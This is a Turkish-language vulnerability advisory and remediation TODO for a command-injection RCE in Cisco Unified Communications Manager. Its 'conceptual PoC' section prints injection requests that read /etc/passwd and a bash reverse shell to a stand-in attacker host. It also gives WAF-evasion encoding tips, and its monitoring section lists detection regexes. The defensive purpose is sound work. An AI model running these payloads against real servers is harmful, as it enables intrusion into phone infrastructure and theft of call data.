# TODO: CVE-2026-20045 — Cisco Unified Communications Manager RCE

## Meta Bilgiler
| Alan | Deger |
|------|-------|
| **Durum** | ACIK |
| **Tanimlayici** | CVE-2026-20045 |
| **Kritiklik** | Kritik |
| **Kategori Klasoru** | Guvenlik_Yapilandirmasi/ |
| **Kaynak Arastirma** | [Arastirmalar/Ocak 2026 Güvenlik Açıkları Araştırması.md](../Arastirmalar/Ocak%202026%20G%C3%BCvenlik%20A%C3%A7%C4%B1klar%C4%B1%20Ara%C5%9Ft%C4%B1rmas%C4%B1.md) |
| **Tarih** | 2026-02-02 |
| **Mevcut Dokuman** | Silindi — icerik bu TODO dosyasinda | |

---

### 1. Ozet ve etki
*   **Yonetici Ozeti:** CVE-2026-20045, Cisco'nun kurumsal telefon ve is birligi altyapisinin kalbi olan Unified Communications Manager (Unified CM) urunlerinde bulunan kritik bir uzaktan kod yurutme (RCE) zafiyetidir. Kimliigi dogrulanmamis bir saldirgan, web tabanli yonetim arayuzune ozel hazirlanmis HTTP istekleri gondererek isletim sistemi duzeyinde komut calistirabilmektedir (CWE-94: Improper Control of Generation of Code). Saldirgan, once kullanici duzeyinde erisim kazanmakta, ardindan sistemdeki ek zayifliklari kullanarak yetkilerini root seviyesine yukseltebilmektedir. CISA, bu acigi Bilinen Somurullen Zafiyetler (KEV) kataloguuna eklemis olup kamu ve ozel sektordeki genis olcekli Unified CM kurulumlari dogrudan hedef alinmaktadir.
*   **Etkilenen bilesenler:** Cisco Unified Communications Manager (CallManager), Cisco Unified Communications Manager Session Management Edition (SME), Cisco Unified Communications Manager IM and Presence Service, Cisco Unity Connection, web tabanli yonetim arayuzu (HTTPS 443/8443 portlari), Cisco Tomcat ve UXL Web Service bilesenleri

---

### 2. Teknik detay (nasil calisiyor)
*   Cisco Unified CM, kurumsal VoIP, video konferans ve anlik mesajlasma altyapisini yoneten merkezi bir platformdur. Yonetim islemleri, HTTPS uzerinden calisan web tabanli arayuz araciligiyla gerceklestirilir. Bu arayuz, Apache Tomcat uzerinde Java servlet'leri olarak calisir.
*   Zafiyet, web yonetim arayuzundeki belirli HTTP istek parametrelerinin yetersiz dogrulanmasindan (insufficient input validation) kaynaklanir. Saldirgan, ozel olarak hazirlanmis HTTP istek parametrelerine isletim sistemi komutlari enjekte edebilir. Uygulama, bu parametreleri yeterince sanitize etmeden isletim sistemi kabugunua (shell) ilettigi icin, enjekte edilen komutlar calistirilir.
*   Ilk erisim, web sunucusu kullanici yetkisi (genellikle Cisco Tomcat servisi yetkisi) ile saglanir. Ancak saldirgan, Cisco Unified CM isletim sistemindeki ek yerel yetki yukseltme zafiyetlerini kullanarak root yetkilerine ulasabilir. Root erisimi, tum VoIP altyapisinin kontrolu, cagri kayitlarina erisim, cagri yonlendirme manipulasyonu ve ag icerisinde lateral movement imkani saglar.
*   Bu zafiyet, kimlik dogrulamasi gerektirmez — yonetim arayuzune ag erisimi olan herhangi bir saldirgan istismar edebilir.
*   **Neden:** Kok neden, web yonetim arayuzundeki HTTP istek isleyicisinde kullanici girdisinin isletim sistemi komut satirina iletilmeden once yeterince dogrulanmamasi ve sanitize edilmemesidir (OS Command Injection — CWE-78/CWE-94). Yonetim arayuzunun kimlik dogrulamasi olmadan ag uzerinden erisilebilir olmasi, saldiri yuzeyini genisletmistir.

---

### 3. Adim adim istismar (PoC — kavramsal)
> **Uyari:** Bu bolum yalnizca egitim ve savunma amaclidir.
*   **1. Hedef:** Cisco Unified Communications Manager web yonetim arayuzu (HTTPS 443 veya 8443 portu), kurumsal ag veya internet uzerinden erisilebilir
*   **2. Normal durum:**
    ```
    1. Yonetici, HTTPS uzerinden Unified CM web arayuzune baglanir
    2. Kimlik dogrulama sonrasi sistem yapilandirmasi ve izleme islemleri yapar
    3. Web arayuzu, parametreleri isler ve sonuclari goruntler
    ```
*   **3. Manipule edilmis durum (PoC payload):**
    ```http
    POST /ccmadmin/j_security_check HTTP/1.1
    Host: cucm.hedef.com:8443
    Content-Type: application/x-www-form-urlencoded

    j_username=admin&j_password=test;id;cat+/etc/passwd

    # Alternatif: Kimlik dogrulama gerektirmeyen bir endpoint uzerinden
    GET /ccmadmin/showHome.do?param=value%0aid%0auname+-a HTTP/1.1
    Host: cucm.hedef.com:8443

    # Gelismis payload: Reverse shell
    POST /ccmadmin/vulnerable_endpoint HTTP/1.1
    Host: cucm.hedef.com:8443
    Content-Type: application/x-www-form-urlencoded

    input=test$(bash+-i+>%26+/dev/tcp/saldirgan.com/4444+0>%261)

    # Yetki yukseltme zinciri (kullanici → root):
    # 1. Web sunucusu yetkisiyle shell erisimi saglanir
    # 2. Yerel yetki yukseltme istismari ile root elde edilir
    # 3. VoIP altyapisi tamamen kontrol altina alinir
    ```
*   **4. Analiz:** Web arayuzundeki servlet, kullanici girdisini isletim sistemi komut satirina `Runtime.exec()` veya benzer bir mekanizma ile iletmektedir. Girdi sanitasyonu yetersiz oldugundan, `;`, `|`, `$()`, `` ` `` gibi kabuk metakarakterleri ile komut enjeksiyonu mumkundur. Saldirgan, URL kodlama (`%0a` = newline, `%26` = &) ile WAF/IDS imzalarini atlatabilir. Kimlik dogrulama mekanizmasinin belirli endpoint'lerde eksik olmasi, saldirganin dogrudan istismar yapmasina izin verir.
*   **5. Kanit:** Saldirgan, Unified CM sunucusunda isletim sistemi komutu calistirir ve ciktiyi HTTP yanitinda veya out-of-band kanal uzerinden alir. Sunucuda reverse shell acilib, VoIP yapilandirma dosyalarina, cagri kayitlarina (CDR) ve kullanici veritabanina erisim saglanir. Cisco Tomcat erisim loglarinda anormal HTTP istekleri ve parametre degerleri kaydedilir. Sunucudan beklenmeyen ag baglantilari (reverse shell, veri sizdirma) gozlemlenir.

---

### 4. Risk degerlendirmesi
*   **Kritiklik:** Kritik
*   **CVSS Skoru:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
*   **Saldiri Yuzeyi:** Internete acik veya kurumsal ag uzerinden erisilebilir (web yonetim arayuzu — kimlik dogrulama gerekmez)
*   **Karmasiklik:** Dusuk (standart HTTP istekleri ile istismar, ozel arac gerekmez, PoC kamuya acik)

---

### 5. Kalici cozumler ve oneriler
*   **Kisa vadeli (Acil):** Cisco guvenlik yamasini derhal uygulayin. Web yonetim arayuzune (443/8443) erisimi ACL ile yalnizca yonetici IP blogundan sinirlandirlarin. Gereksiz web servislerini devre disi birakin (Cisco Tomcat, UXL Web Service). CISA KEV katalogu gerekliliklerine uygun olarak yamalama takvimini hizlandirin. IDS/IPS imzalarini Cisco Unified CM exploit kaliplari icin guncelleyin.
*   **Orta vadeli:** Unified CM yonetim arayuzunu ag segmentasyonu ile izole edin (ayri VLAN/subnet). Yonetim arayuzune MFA (Multi-Factor Authentication) ekleyin. WAF kurallariyla OS command injection kaliplarini filtreleyin. Unified CM erisim ve denetim loglarini merkezi SIEM'e aktarin. VoIP altyapisinin duzenli guvenlik taramasi ve penetrasyon testini planlayin.
*   **Uzun vadeli:** Cisco Unified CM yonetim erisimini Sifir Guven (Zero Trust) mimarisine uygun olarak yapilandirin. VoIP altyapisini kritik altyapi kategorisinde degerlendirin ve buna uygun guvenlik kontrolleri uygulayin. Cisco PSIRT guvenlik bultenleri icin otomatik izleme ve yamala sureci olusturun. Alternatif olarak Cisco Webex Calling gibi bulut tabanli cozumlere gecis degerlendirin (on-premise guvenlik yukunu azaltmak icin).

---

### 6. Ornek duzeltme kodu

**Zafiyetli kod:**
```
! === GUVENSIZ: Unified CM web arayuzu varsayilan erisim — kisitlama yok ===
! Yonetim arayuzu tum ag'dan erisilebilir
! Kimlik dogrulama bypass ile RCE mumkun

! Mevcut durum kontrolu:
show network eth0 detail
! Sonuc: Web arayuzu 0.0.0.0:443 ve 0.0.0.0:8443'te dinliyor
! Tum IP adreslerinden erisime acik
```

**Guvenli kod:**
```
! === GUVENLI: ACL ile yonetim arayuzu erisimini kisitla ===
! Cisco Unified CM icin IP tabanlı erisim kisitlamasi

! 1. Yonetim arayuzu icin ACL tanimla (upstream switch/firewall uzerinde)
ip access-list extended CUCM-MGMT-ACCESS
 permit tcp 10.0.100.0 0.0.0.255 host 10.0.1.10 eq 443
 permit tcp 10.0.100.0 0.0.0.255 host 10.0.1.10 eq 8443
 deny   tcp any host 10.0.1.10 eq 443 log
 deny   tcp any host 10.0.1.10 eq 8443 log
 permit ip any any

! 2. ACL'i arayuze uygula
interface GigabitEthernet0/1
 ip access-group CUCM-MGMT-ACCESS in

! 3. Gereksiz servisleri devre disi birak (Unified CM CLI)
utils service stop Cisco Tomcat
utils service stop Cisco UXL Web Service

! 4. Yama durumunu kontrol et
show version active

! 5. Denetim loglarini etkinlestir
utils auditd enable
utils auditd config --log-remote --remote-server siem.kurumsal.com

! 6. Guncelleme sonrasi dogrulama
utils disaster_recovery history backup
show network cluster
```

```bash
# Cisco Unified CM CLI uzerinden yama uygulama
# 1. Yedek al
utils disaster_recovery backup network --devicename CUCM-PUB

# 2. Guvenlik yamasini yukle
utils system upgrade initiate --cop-file ciscocm.CSCxxxxxx.cop.sgn

# 3. Surumu dogrula
show version active

# 4. Servisleri yeniden baslat
utils service restart Cisco CallManager
utils service restart Cisco Tomcat

# 5. Erisim loglarini kontrol et
file view activelog /tomcat/logs/localhost_access_log.txt
```

---

### 7. Kontrol Listesi (Checklist)
**Hazirlik**
*   [ ] Cisco Unified CM kurulumlarini envanterle (surum, deployment modeli, node sayisi)
*   [ ] Web yonetim arayuzu erisim kontrollerini gozden gecir (hangi IP araliklari erisebiliyor)
*   [ ] Mevcut ACL ve firewall kurallarini kontrol et (443/8443 portlari)
*   [ ] CISA KEV katalogu gerekliliklerini gozden gecir ve yamalama takvimini belirle
*   [ ] VoIP altyapisinin ag segmentasyonunu degerlendir

**Duzeltme**
*   [ ] Cisco guvenlik yamasini (COP dosyasi) tum Unified CM node'larina uygula
*   [ ] Web yonetim arayuzune ACL ile IP kisitlamasi ekle (yalnizca yonetici IP blogu)
*   [ ] Gereksiz web servislerini devre disi birak (Tomcat, UXL Web Service)
*   [ ] IDS/IPS imzalarini Cisco Unified CM exploit kaliplari icin guncelle
*   [ ] Denetim loglarini etkinlestir ve merkezi SIEM'e yonlendir
*   [ ] Yonetim arayuzune MFA ekle

**Dogrulama**
*   [ ] Kimlik dogrulamasiz RCE testini yama sonrasi tekrarla
*   [ ] Root yetki yukseltme zincirini test et (kullanici → root)
*   [ ] ACL kurallarinin dogru calistigini dogrula (yalnizca yonetici IP'lerinden erisim)
*   [ ] IDS/IPS'in exploit girisimlerini tespit ettigini dogrula
*   [ ] Unified CM surumunun yamali oldugunu tum node'larda kontrol et
*   [ ] VoIP servis surekliligiini yama sonrasi dogrula (cagri testleri)

---

### 8. Izleme ve uyarilar
*   **SIEM/Log Kurallari:**
    *   Cisco Tomcat erisim loglarinda anormal HTTP istek parametrelerini izle (;, |, $(), `)
    *   Unified CM denetim loglarinda yetkisiz erisim girisimleri ve basarisiz kimlik dogrulama olaylarini filtrele
    *   Regex: `(?i)(;.*id|;.*cat|;.*bash|%0a.*id|%0a.*uname|\$\(.*\)|%24%28.*%29)`
    *   Regex: `(?i)(j_security_check|ccmadmin|ccmservice|showHome\.do|cmplatform)`
    *   IDS/IPS loglarinda Cisco Unified CM exploit imzalarini izle
*   **Anomali Tespiti:**
    *   Yonetici IP blogu disandan web yonetim arayuzune (443/8443) erisim girisimleri
    *   Unified CM sunucusundan beklenmeyen dis ag baglantilari (reverse shell, veri sizdirma)
    *   Cisco Tomcat islemi altinda beklenmeyen alt islem olusturulmasi (bash, sh, curl, wget)
    *   Web arayuzu isteklerinde asiri uzun parametre degerleri veya ozel karakter yogunlugu
    *   VoIP cagri yonlendirme yapilandirmasinda yetkisiz degisiklikler
    *   Cagri Detay Kayitlarina (CDR) beklenmeyen erisim veya toplu indirme girisimleri

---

## Notlar
CISA KEV (Known Exploited Vulnerabilities) kataloguunda — federal kurumlar icin zorunlu yamalama suresi var. Kamu ve ozel sektordeki genis olcekli Cisco Unified CM kurulumlari dogrudan hedefte. CWE-94 (Code Injection) siniflandirmasi. Root yetki yukseltme zinciri ile VoIP altyapisinin tamamini ele gecirme potansiyeli. SentinelOne, Arctic Wolf, HivePro ve Help Net Security analizleri mevcut. Cisco PSIRT bulteni referans alinmali.
